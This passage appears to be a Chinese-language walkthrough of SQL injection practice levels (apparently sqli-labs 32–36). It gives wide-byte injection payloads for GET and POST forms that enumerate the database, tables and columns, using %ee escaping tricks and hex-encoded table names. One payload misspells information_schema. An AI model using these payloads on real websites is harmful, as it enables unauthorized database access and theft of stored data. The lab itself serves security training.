![image](https://user-images.githubusercontent.com/76896357/115107537-03a92d00-9f9e-11eb-9e20-9549a227a1f4.png)

剩下的基本上就没什么问题了

* 查列，这时候的users需要改变一下

```
?id=-1%ee' union select 1,2,column_name from information_schcema.columns where table_name='users' --+//不行
?id=-1%ee' union select 1,2,column_name from information_schcema.columns where table_name=0x7573657273 --+//对user进行十六进制编码，此时的‘’可以用0x代替
```
![image](https://user-images.githubusercontent.com/76896357/115107796-a44c1c80-9f9f-11eb-9a20-f40227e9bca2.png)

剩下就没啥了。。。过


## 33.宽字节注入

仍然是刚才查列的句子，直接爆出来了。。

![image](https://user-images.githubusercontent.com/76896357/115107901-1d4b7400-9fa0-11eb-8dde-662f50efa7a5.png)

估计和上一题一样

## 34. POST型宽字节注入

这样的做法，已经比较熟悉了，看见表单抓包构建payload。。

* 查看有没有回显，显没有进行查看闭合方式，因为如果闭合方式不对的话，是会报错的
```
admin%ee' union select 1,2 #
```
![image](https://user-images.githubusercontent.com/76896357/115108242-e8402100-9fa1-11eb-98c1-56da982232db.png)

* 查库
```
uname=admin%ee' union select 1,database() #&passwd=admin&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/115108290-32c19d80-9fa2-11eb-8bc1-0593bf408eaf.png)

* 查表
```
uname=admin%ee' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() #&passwd=admin&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/115108348-92b84400-9fa2-11eb-9da0-c54c555a1149.png)

* 查字段
```
uname=admin%ee' union select 1,group_concat(column_name) from information_schema.columns where table_name='users' #&passwd=admin&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/115108418-f2165400-9fa2-11eb-8443-ed7484f40e79.png)

直接报错，根据错误也知道发生了啥

```
uname=admin%ee' union select 1,group_concat(column_name) from information_schema.columns where table_name=0x7573657273 #&passwd=admin&submit=Submit
```
![image](https://user-images.githubusercontent.com/76896357/115108450-1bcf7b00-9fa3-11eb-8cb8-9f80bf568404.png)

这样就和谐了。。。

过了，不说了。。。

## 35. 为什么要有。。。

![image](https://user-images.githubusercontent.com/76896357/115108517-7cf74e80-9fa3-11eb-848b-e11ce4ec9cc6.png)

看这个报错，你会发现，啊这，他好像没有闭合方式呀！！！

* 查看否是否有回显

![image](https://user-images.githubusercontent.com/76896357/115108541-9e583a80-9fa3-11eb-8179-01b65c93347c.png)


很显然，这道题还是比较简单的，过了过了。。。

## 36. 

* 查看有没有回显

![image](https://user-images.githubusercontent.com/76896357/115108637-263e4480-9fa4-11eb-9ecb-6665ec88bb6f.png)

* 查库

![image](https://user-images.githubusercontent.com/76896357/115108676-5980d380-9fa4-11eb-8850-75f76c722a7c.png)

* 查表

![image](https://user-images.githubusercontent.com/76896357/115108722-8cc36280-9fa4-11eb-9985-bbaa4827ed7c.png)

* 查字段

![image](https://user-images.githubusercontent.com/76896357/115108755-c005f180-9fa4-11eb-864b-0ab5ede5fee5.png)

* 查字段内容

![image](https://user-images.githubusercontent.com/76896357/115108784-eaf04580-9fa4-11eb-91f2-16227934e14b.png)

这道题。。。。不透。。。










































































































































































































































